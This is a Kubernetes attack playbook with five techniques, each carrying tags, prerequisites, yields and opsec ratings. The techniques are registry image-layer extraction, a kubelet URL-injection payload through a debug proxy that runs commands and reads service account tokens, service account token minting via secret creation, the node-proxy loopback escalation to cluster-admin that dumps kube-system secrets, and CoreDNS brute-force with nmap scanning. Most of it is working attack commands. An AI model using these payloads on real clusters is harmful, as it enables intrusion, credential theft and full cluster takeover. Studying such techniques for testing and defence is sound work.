# Kubernetes Attack Techniques

### OCI Image Layer Extraction via ORAS [added: 2026-05]
- **Tags:** #Kubernetes #ContainerRegistry #OCI #ORAS #SourceCodeDisclosure #ImageRecon #K8s #ContainerImage #LayerExtraction
- **Trigger:** Pod spec contains a registry image path (e.g., `target.azurecr.io/debug-bridge:latest`); ORAS tool is available in the pod environment; registry is accessible from the pod network
- **Prereq:** Pod with network access to a container registry; ORAS binary present; `kubectl get pod -o yaml` reveals image names
- **Yields:** Full OCI image layers extracted to local filesystem; embedded source code (`.go`, `.py`, scripts) recoverable from image history and layers; credentials/tokens hardcoded in ENV layers
- **Opsec:** Low (reads from registry — no writes; appears as normal image pull)
- **Context:** Kubernetes debug/bridge pods often reference other images in the same registry. The pod's service account may have ACR/ECR/GCR pull permissions. `COPY <sourcefile> .` in Dockerfiles includes source even if the final image hides it — it is stored in a layer. `kubectl get pod -o yaml` reveals image names; ORAS then accesses the registry using ambient pod credentials.
- **Payload/Method:**
```bash
# Step 1: Find registry from pod spec
kubectl get pod <pod> -o yaml | grep image:
# e.g., target.azurecr.io/test:latest → registry: target.azurecr.io

# Step 2: List all repos in the registry
oras repo ls target.azurecr.io

# Step 3: Pull image to OCI layout directory
oras copy target.azurecr.io/debug-bridge:latest --to-oci-layout debug-bridge/

# Step 4: Parse image manifest to find layers
cd debug-bridge/
jq . index.json
# Find platform-specific digest (architecture: amd64), then:
jq . blobs/sha256/<MANIFEST_DIGEST>

# Step 5: Parse config blob for history — reveals COPY/ENV/RUN commands
jq . blobs/sha256/<CONFIG_DIGEST>
# Look for: "created_by": "COPY /app/app.go ." — source code present in a layer

# Step 6: Extract layers to recover source files
mkdir /tmp/rootfs
for digest in <LAYER_DIGEST_1> <LAYER_DIGEST_2>; do
  tar -xzf blobs/sha256/$digest -C /tmp/rootfs 2>/dev/null
done
cat /tmp/rootfs/root/app.go  # source code recovered
```

---

### Kubernetes Kubelet URL Injection via Unauthenticated Debug Proxy [added: 2026-05]
- **Tags:** #Kubernetes #Kubelet #URLInjection #RCE #K8s #SSRF #UnauthenticatedService #KubeletAPI #DebugBridge #FragmentBypass
- **Trigger:** Internal Kubernetes service exposes an HTTP debug/proxy endpoint that proxies requests to the kubelet API using user-supplied parameters (pod name, namespace, node IP); source code recovered from image inspection confirms URL construction pattern
- **Prereq:** Access to unauthenticated debug service; knowledge of target pod name/namespace/container; network route to the service (in-cluster)
- **Yields:** RCE inside any container the kubelet can reach; extract service account tokens from target containers; lateral movement to higher-privilege pods
- **Opsec:** Med (kubelet API calls logged; unauthenticated service access unusual)
- **Context:** Debug bridges that proxy kubelet API calls often use `fmt.Sprintf("https://%s:10250/endpoint/%s/%s/%s", nodeIP, ...)` — if `nodeIP` is user-supplied and not sanitized, an attacker can inject a full path+port into the host portion. The `#` URL fragment character truncates everything after it (ignored by the HTTP client), effectively replacing the kubelet endpoint with `/run` for command execution. The kubelet `/run` endpoint executes commands in a running container and streams stdout/stderr back.
- **Payload/Method:**
```bash
# Normal debug bridge call (baseline):
curl http://debug-bridge.app/checkpoint \
  -d '{"node_ip": "172.30.0.2", "pod": "app-blog", "namespace": "app", "container": "app-blog"}'
# Builds: https://172.30.0.2:10250/checkpoint/app/app-blog/app-blog

# Injection: replace node_ip with path+port injection, use # to truncate validation
# kubelet /run endpoint: POST /run/{namespace}/{pod}/{container}?cmd=<command>
curl http://debug-bridge.app/checkpoint \
  -d '{"node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=id#", "pod": "app-blog", "namespace": "app", "container": "app-blog"}'
# Built URL: https://172.30.0.2:10250/run/app/app-blog/app-blog?cmd=id#/checkpoint/...
# The # causes HTTP client to send only up to the fragment — /run?cmd=id is what reaches kubelet

# Extract service account token from target container:
curl http://debug-bridge.app/checkpoint \
  -d '{"node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#", "pod": "app-blog", "namespace": "app", "container": "app-blog"}'

# Extract ca.crt:
curl http://debug-bridge.app/checkpoint \
  -d '{"node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt#", "pod": "app-blog", "namespace": "app", "container": "app-blog"}'
```

---

### Kubernetes Service Account Long-Lived Token Minting via Secret Creation [added: 2026-05]
- **Tags:** #Kubernetes #ServiceAccount #TokenMinting #PrivEsc #K8s #SecretCreation #RBAC #LateralMovement #LongLivedToken
- **Trigger:** Current K8s identity has `create` permission on `secrets` in a namespace; a high-privilege service account exists in the same namespace (found via logs, image source code, or kubelet RCE); target SA has no static token yet
- **Prereq:** `kubectl auth can-i create secrets -n <namespace>` returns yes; target service account name known
- **Yields:** Long-lived static token for the target service account; full RBAC permissions of that SA; enables lateral movement or cluster-admin escalation
- **Opsec:** Med (secret creation is logged; unusual for non-admin to create SA token secrets)
- **Context:** Kubernetes ≥1.24 no longer auto-generates long-lived tokens. However, creating a Secret of type `kubernetes.io/service-account-token` with annotation `kubernetes.io/service-account.name: <target-sa>` causes the token controller to automatically populate a signed JWT for that SA. This requires only `create` on secrets in the namespace — not admin access.
- **Payload/Method:**
```bash
# Step 1: Create the token-type secret annotated to target SA
cat > sa-token-secret.yml << 'YAML'
apiVersion: v1
kind: Secret
metadata:
  name: target-sa-token
  namespace: app
  annotations:
    kubernetes.io/service-account.name: "debug-bridge"
type: kubernetes.io/service-account-token
YAML
kubectl --kubeconfig=app.yaml apply -f sa-token-secret.yml

# Step 2: Retrieve the auto-populated token (token controller populates within ~5s)
kubectl --kubeconfig=app.yaml get secret target-sa-token -n app -o yaml

# Step 3: Extract and decode
TOKEN=$(kubectl --kubeconfig=app.yaml -n app get secret target-sa-token \
  -o jsonpath='{.data.token}' | base64 -d)

# Step 4: Enumerate permissions of the new identity
kubectl --token "$TOKEN" \
  --server https://kubernetes.default.svc.cluster.local \
  --certificate-authority /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  auth can-i --list
```

---

### Kubernetes Node Proxy API Server Loopback Attack (NCC-E003660-JAV) [added: 2026-05]
- **Tags:** #Kubernetes #PrivEsc #NodeProxy #APIServer #ClusterAdmin #K8s #Loopback #NCC #NodeStatus #KubeletPort #SecurityAudit
- **Trigger:** K8s service account has `get` on `nodes/proxy` subresource AND `patch` on `nodes/status`; confirmed via `kubectl auth can-i --list`
- **Prereq:** Token with `nodes/proxy` GET + `nodes/status` PATCH permissions; API server IP and node hostname known
- **Yields:** Cluster-administrator level API access; read all secrets across all namespaces including kube-system; equivalent to cluster-admin without being granted it
- **Opsec:** High (node status patch is anomalous; API server audit logs show self-authentication; immediately noticeable in SIEM)
- **Context:** Issue NCC-E003660-JAV from Kubernetes 1.24 security audit (sig-security 2021-2022 report, page 24). By patching the kubelet port field in node status to point to the API server port (6443), subsequent `nodes/proxy` requests cause the API server to make an outbound HTTPS request to itself — authenticating with cluster-admin credentials. The response is the API server's own response, granting access to all resources.
- **Payload/Method:**
```bash
export TOKEN="<service-account-token-with-nodes-proxy-and-nodes-status>"
readonly NODE="noder"
readonly API_SERVER_IP="172.30.0.1"
readonly API_SERVER_PORT=6443

# Step 1: Fetch current node status (captures current kubelet port)
curl -k -H "Authorization: Bearer ${TOKEN}" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status" \
  > "${NODE}-orig.json"

# Step 2: Patch kubelet port in status JSON to redirect to API server port
sed "s/\"Port\": 10250/\"Port\": ${API_SERVER_PORT}/g" \
  "${NODE}-orig.json" > "${NODE}-patched.json"

# Step 3: PATCH node status with modified kubelet port
curl -k -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/merge-patch+json" \
  -X PATCH -d "@${NODE}-patched.json" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status"

# Step 4: Proxy through API server to itself — cluster-admin response
curl -kv -H "Authorization: Bearer ${TOKEN}" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/proxy/api/v1/secrets"

# Step 5: Target kube-system for flags/credentials
curl -k -H "Authorization: Bearer ${TOKEN}" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/proxy/api/v1/namespaces/kube-system/secrets"
```

---

### Kubernetes CoreDNS Brute Force Service Discovery [added: 2026-05]
- **Tags:** #Kubernetes #Recon #CoreDNS #ServiceDiscovery #K8s #DNSEnum #InternalNetwork #ClusterLocal #ServiceCIDR
- **Trigger:** Shell access inside a Kubernetes pod; limited RBAC (cannot `kubectl get services`); need to discover what services are running in the cluster
- **Prereq:** `coredns-enum` binary available in pod; knowledge of service CIDR (default 10.43.0.0/16 for K3s, 10.96.0.0/12 for kubeadm); CoreDNS reachable
- **Yields:** Full list of running services with IPs and DNS names; identifies attack surface (databases, APIs, debug services) without API server access
- **Opsec:** Med (generates many DNS queries; CoreDNS logs may capture)
- **Context:** Even with no RBAC permissions, pods can query CoreDNS. `coredns-enum` brute-forces the `cluster.local` zone across the service CIDR to discover all services. Default CIDR varies: K3s uses 10.43.0.0/16, kubeadm uses 10.96.0.0/12. Cross-reference `env | grep KUBERNETES_SERVICE_HOST` to narrow the range.
- **Payload/Method:**
```bash
# Identify service CIDR from pod environment
env | grep -i 'KUBERNETES\|K8S'
# KUBERNETES_SERVICE_HOST=10.43.1.1 → service CIDR likely 10.43.0.0/16

# Brute-force CoreDNS for all cluster services
coredns-enum --mode bruteforce --cidr 10.43.0.0/16 --zone cluster.local
# Output: service IPs + DNS names (e.g., debug-bridge.app.svc.cluster.local)

# Follow up with nmap on discovered IPs
nmap -n -Pn -sT -p 80,443,8080,8000,3000,5000,8443,9000 <discovered_ips>
nmap -p- <node_ips> -T5
```
